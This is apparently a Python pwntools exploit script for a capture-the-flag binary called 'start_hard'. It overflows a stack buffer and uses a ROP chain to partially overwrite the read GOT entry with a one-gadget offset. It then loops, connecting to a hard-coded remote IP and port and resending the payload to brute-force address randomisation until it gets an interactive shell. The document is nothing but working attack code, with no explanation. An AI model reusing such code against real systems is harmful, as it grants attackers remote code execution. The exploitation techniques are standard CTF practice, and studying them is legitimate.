from pwn import *

libc = ELF('libc.so.6')
target = ELF('start_hard')

def debug(s):
	g = gdb.attach(s,'''
	b*0x0000000000400546
	c
	p read-0x6109
	x/a 0x601018
	''')


def pwn(s):
#	debug(s)

	magic = 0xf0567
	read = 0x00000000000f6670

	poprsi = 0x004005c1	#pop rsi; pop r15; ret
	poprdi = 0x004005c3	#pop rdi; ret
	main = 0x0000000000400526

	start = 0x0000000000400430

	payload = 'A'*(0x10 + 8) + p64(poprsi) + p64(target.got['read']) + 'B'*8
	payload += p64(target.symbols['read'])
	payload += p64(0x000000000040044D)

	payload = payload.ljust(0x400,'\x00')
	payload += '\x67\x55'
	s.send(payload)

	s.interactive()

def main():
	while 1:
#		s = process('./start_hard')
		s = remote('128.199.152.175', 10001)
		pwn(s)

main()
